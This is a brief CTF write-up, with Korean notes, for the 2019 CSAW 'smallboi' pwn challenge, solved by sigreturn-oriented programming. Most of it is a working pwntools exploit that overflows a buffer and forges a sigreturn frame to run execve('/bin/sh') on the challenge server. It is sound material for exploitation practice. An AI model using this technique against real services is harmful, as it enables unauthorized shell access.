---
title: CSAW smallboi write up
categories: [2019, CSAW]
tags: [CTF, pwn, bof, easy, srop]
---

CSAW write up

subject   | problem
----------|------------
CTF       | 2019 CSAW
Tags      | pwn
score     | 100
env       | ubuntu 18.04
problem   | bof, easy, x64, srop

# analysis

BOF가 나지만 가젯 없다. read 등을 syscall로 구현한 작은 바이너리.

# solve

SROP를 이용하여 쉘을 얻는다.

# ex.py
``` python
#!/usr/bin/env/python
# powerprove

from pwn import *
import sys

if len(sys.argv) < 2:
    host = "localhost"
    port = 4000
else:
    host = "pwn.chal.csaw.io"
    port = 1002

if __name__ == "__main__":
    s = remote(host, port)
    raw_input()

    binsh = 0x0000000004001CA
    syscall = 0x00000000004001C5
    payload = "A"*40
    payload += p64(0x000000000400180)

    frame = SigreturnFrame(arch="amd64")
    frame.rax = 0x3b
    frame.rdi = binsh
    frame.rip = syscall

    payload += str(frame)

    s.sendline(payload)
    

    s.sendline(payload)
    s.interactive()
```